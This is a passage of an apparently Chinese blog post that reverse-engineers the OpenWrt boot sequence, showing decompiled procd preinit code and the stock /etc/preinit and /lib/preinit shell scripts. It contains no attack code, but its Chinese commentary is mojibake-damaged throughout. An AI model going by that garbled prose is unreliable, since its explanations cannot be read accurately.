class="type">int</span>)sub_9344;</span><br><span class="line">  v0 = fork();</span><br><span class="line">  dword_12488 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )                                    <span class="comment">// å­</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(file[<span class="number">0</span>], file);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start plugd\n&quot;</span>);</span><br><span class="line">    v1 = &amp;byte_9F8F;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new plugd instance\n&quot;</span>);</span><br><span class="line">    v2 = byte_9FAD;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">uloop_process_add</span>(&amp;unk_12478);</span><br><span class="line">  <span class="built_in">setenv</span>(<span class="string">&quot;PREINIT&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  dword_12498 = (<span class="type">int</span>)sub_9350;</span><br><span class="line">  v3 = fork();</span><br><span class="line">  dword_1249C = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">execvp</span>(v6[<span class="number">0</span>], v6);</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start preinit\n&quot;</span>);</span><br><span class="line">    v1 = <span class="string">&quot;procd: Failed to start preinit\n&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">fputs</span>(v1, (FILE *)stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to start new preinit instance\n&quot;</span>);</span><br><span class="line">    v2 = <span class="string">&quot;procd: Failed to start new preinit instance\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fputs</span>(v2, (FILE *)stderr);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">uloop_process_add</span>(&amp;unk_1248C);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dword_12474 &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched preinit instance, pid=%d\n&quot;</span>, dword_1249C);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched preinit instance, pid=%d\n&quot;</span>, <span class="string">&quot;preinit&quot;</span>, <span class="number">120</span>, dword_1249C);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆforkè¿è¡Œ&#x2F;sbin&#x2F;procdï¼Œä»¥-h &#x2F;etc&#x2F;hotplug-preinit.jsonä½œä¸ºå‚æ•°ï¼Œä¹‹åuloop_process_add(&amp;unk_12478);ï¼Œ setenv(â€œPREINITâ€, â€œ1â€, 1);è®¾ç½®preinitä¸º1ä½œä¸ºflagï¼Œä¹‹åforkè¿è¡Œ&#x2F;bin&#x2F;shï¼Œä»¥&#x2F;etc&#x2F;preinitä½œä¸ºå‚æ•°</p><blockquote><p><code>execvp</code> ä¼šåŠ è½½æ–°çš„ç¨‹åºåˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œè¦†ç›–åŸæœ‰çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆï¼Œå› æ­¤ç´§è·Ÿexecvpåé¢çš„ä¾¿æ˜¯é”™è¯¯çš„è¾“å‡º</p></blockquote><blockquote><p>uloop_process æ˜¯ Libubox æä¾›çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å·¥å…·,å®ƒå¹¶ä¸ä¼šå¸®ä½ åˆ›å»ºè¿›ç¨‹ï¼Œå®ƒä¸»è¦ç”¨æ¥ç­‰å¾…å­è¿›ç¨‹å·¥ä½œçš„ç»“æŸï¼Œç„¶åè°ƒç”¨è‡ªå®šä¹‰çš„å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦é…åˆ <code>fork</code>ä¸€èµ·ä½¿ç”¨ã€‚</p></blockquote><p>è¿™é‡Œæ³¨æ„è§‚å¯Ÿä¸¤ä¸ªåœ°æ–¹</p><p>uloop_process_add(&amp;dword_12478);å’Œresult &#x3D; uloop_process_add(&amp;dword_1248C);ï¼Œå…¶å®è¿™ä¸ªaddçš„æ˜¯ç»“æ„ä½“</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">uloop_process</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">list_head</span> list;</span><br><span class="line"><span class="type">bool</span> pending;</span><br><span class="line">uloop_process_handler cb;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å®é™…è°ƒç”¨çš„å‡½æ•°æ˜¯cbï¼Œè€Œlist_headä¸€èˆ¬åŒ…æ‹¬preå’Œnextä¸¤ä¸ªæŒ‡é’ˆå ç”¨8ä¸ªå­—èŠ‚ï¼Œpendingç”±äºå¯¹é½å ç”¨4ä¸ªå­—èŠ‚</p><p>å› æ­¤ä¹‹åmainå‡½æ•°è¿è¡Œuloop_run(v1);è¿™ä¸ªæ—¶ï¼Œè°ƒç”¨çš„åˆ†åˆ«æ˜¯sub_9344å’Œsub_9350å‡½æ•°ï¼Œä½†æ˜¯é¦–å…ˆæ¥çœ‹ä¹‹åè¿è¡Œçš„&#x2F;sbin&#x2F;procdå’Œ&#x2F;etc&#x2F;preinit</p><h3 id="sbin-procd"><a href="#sbin-procd" class="headerlink" title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_1CEE4 = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sub_10E20</span>(optarg);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        dword_1AD68 = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯-hå‚æ•°ï¼Œå› æ­¤çœ‹å‰é¢å³å¯ï¼ŒDBGLVLä¼°è®¡æ˜¯æµ‹è¯•debugç”¨çš„</p><h4 id="sub-10E20"><a href="#sub-10E20" class="headerlink" title="sub_10E20"></a>sub_10E20</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_10E20</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">uloop_init</span>();</span><br><span class="line">  v2 = <span class="built_in">sub_10C5C</span>((<span class="type">const</span> <span class="type">char</span> *)a1);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_10C5Cå‡½æ•°åŠŸèƒ½å¦‚ä¸‹</p><ol><li><strong>è®¾ç½®çƒ­æ’æ‹”å¥—æ¥å­—ï¼š</strong>ï¼ˆç±»ä¼¼usbç­‰ï¼‰<ul><li>åˆ›å»ºå¹¶ç»‘å®šä¸€ä¸ªå¥—æ¥å­—ï¼Œç”¨äºå¤„ç†çƒ­æ’æ‹”äº‹ä»¶ã€‚</li></ul></li><li><strong>é”™è¯¯å¤„ç†ï¼š</strong><ul><li>å¦‚æœå¥—æ¥å­—åˆ›å»ºæˆ–ç»‘å®šå¤±è´¥ï¼Œè®°å½•é”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºã€‚</li></ul></li><li><strong>é…ç½®å¥—æ¥å­—é€‰é¡¹ï¼š</strong><ul><li>è®¾ç½®æ¥æ”¶ç¼“å†²åŒºçš„å¤§å°ã€‚</li></ul></li><li><strong>åˆå§‹åŒ– JSON è„šæœ¬ï¼š</strong><ul><li>è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå‡†å¤‡å¤„ç† JSON è„šæœ¬ã€‚</li></ul></li><li><strong>æ·»åŠ åˆ°äº‹ä»¶å¾ªç¯ï¼š</strong><ul><li>å°†å¥—æ¥å­—æ·»åŠ åˆ°äº‹ä»¶å¾ªç¯ä¸­ï¼Œä»¥ä¾¿å¼‚æ­¥å¤„ç†äº‹ä»¶ã€‚</li></ul></li></ol><h3 id="etc-preinit"><a href="#etc-preinit" class="headerlink" title="&#x2F;etc&#x2F;preinit"></a>&#x2F;etc&#x2F;preinit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">[ -z &quot;$PREINIT&quot; ] &amp;&amp; exec /sbin/init</span><br><span class="line"></span><br><span class="line">export PATH=/bin:/sbin:/usr/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">pi_ifname=</span><br><span class="line">pi_ip=192.168.1.1</span><br><span class="line">pi_broadcast=192.168.1.255</span><br><span class="line">pi_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_ifname=</span><br><span class="line">fs_failsafe_ip=192.168.1.1</span><br><span class="line">fs_failsafe_broadcast=192.168.1.255</span><br><span class="line">fs_failsafe_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_wait_timeout=2</span><br><span class="line"></span><br><span class="line">pi_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_path=&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span><br><span class="line">pi_init_cmd=&quot;/sbin/init&quot;</span><br><span class="line"></span><br><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br><span class="line"></span><br><span class="line">boot_hook_init preinit_essential</span><br><span class="line">boot_hook_init preinit_main</span><br><span class="line">boot_hook_init failsafe</span><br><span class="line">boot_hook_init initramfs</span><br><span class="line">boot_hook_init preinit_mount_root</span><br><span class="line"></span><br><span class="line">for pi_source_file in /lib/preinit/*; do</span><br><span class="line">. $pi_source_file</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_essential</span><br><span class="line"></span><br><span class="line">pi_mount_skip_next=false</span><br><span class="line">pi_jffs2_mount_success=false</span><br><span class="line">pi_failsafe_net_message=false</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_main</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br></pre></td></tr></table></figure><p>function.shå®šä¹‰äº†ä¸€ç³»åˆ—é…ç½®å‡½æ•°ï¼Œ</p><p>&#x2F;lib&#x2F;functions&#x2F;preinit.shä¸­å®šä¹‰äº†boot_hook_initå‡½æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">boot_hook_init() &#123;</span><br><span class="line">local hook=&quot;$&#123;1&#125;_hook&quot;</span><br><span class="line">export -n &quot;PI_STACK_LIST=$&#123;PI_STACK_LIST:+$PI_STACK_LIST &#125;$hook&quot;</span><br><span class="line">export -n &quot;$hook=&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºboot_hook_init preinit_essentialï¼Œä¾¿æœ‰preinit_essential_hook&#x3D; ä¹‹ç±»çš„ç¯å¢ƒå˜é‡</p><p>ä¹‹ååˆå§‹åŒ–ä¸€ç³»åˆ—çš„hookï¼Œç„¶åè°ƒç”¨&#x2F;lib&#x2F;preinitä¸‹çš„å‡½æ•°</p><p>è°ƒç”¨äº†å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">define_default_set_state() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main define_default_set_state</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="function"><span class="title">do_ipq806x</span></span>() &#123;</span></span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main do_ipq806x</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">commands <span class="keyword">for</span> emitting messages to network <span class="keyword">in</span> failsafe mode</span></span><br><span class="line"></span><br><span class="line">indicate_failsafe_led () &#123;</span><br><span class="line">set_state failsafe</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">indicate_failsafe() &#123;</span><br><span class="line">echo &quot;- failsafe -&quot;</span><br><span class="line">preinit_net_echo &quot;Entering Failsafe!\n&quot;</span><br><span class="line">indicate_failsafe_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe indicate_failsafe</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">preinit_ip() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> the preinit interface isn<span class="string">&#x27;t specified and ifname is set in</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">preinit.arch use that interface</span></span></span><br><span class="line">if [ -z &quot;$pi_ifname&quot; ]; then</span><br><span class="line">pi_ifname=$ifname</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname $pi_ip netmask $pi_netmask broadcast $pi_broadcast up</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_ip_deconfig() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname 0.0.0.0 down</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_net_echo() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">&#123;</span><br><span class="line">[ &quot;$pi_preinit_net_messages&quot; = &quot;y&quot; ] || &#123;</span><br><span class="line">[ &quot;$pi_failsafe_net_message&quot; = &quot;true&quot; ] &amp;&amp;</span><br><span class="line">[ &quot;$pi_preinit_no_failsafe_netmsg&quot; != &quot;y&quot; ]</span><br><span class="line">&#125;</span><br><span class="line">&#125; &amp;&amp; netmsg $pi_broadcast &quot;$1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_echo() &#123;</span><br><span class="line">preinit_net_echo $1</span><br><span class="line">echo $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_led() &#123;</span><br><span class="line">set_state preinit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Doing OpenWRT Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main preinit_ip</span><br><span class="line">boot_hook_add preinit_main pi_indicate_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">!/bin/sh</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2006-2010 OpenWrt.org</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2010 Vertical Communications</span></span></span><br><span class="line"></span><br><span class="line">fs_wait_for_key () &#123;</span><br><span class="line">local timeout=$3</span><br><span class="line">local timer</span><br><span class="line">local do_keypress</span><br><span class="line">local keypress_true=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_wait=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_sec=&quot;$(mktemp)&quot;</span><br><span class="line">if [ -z &quot;$keypress_wait&quot; ]; then</span><br><span class="line">keypress_wait=/tmp/.keypress_wait</span><br><span class="line">touch $keypress_wait</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_true&quot; ]; then</span><br><span class="line">keypress_true=/tmp/.keypress_true</span><br><span class="line">touch $keypress_true</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_sec&quot; ]; then</span><br><span class="line">keypress_sec=/tmp/.keypress_sec</span><br><span class="line">touch $keypress_sec</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; INT</span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; USR1</span><br><span class="line"></span><br><span 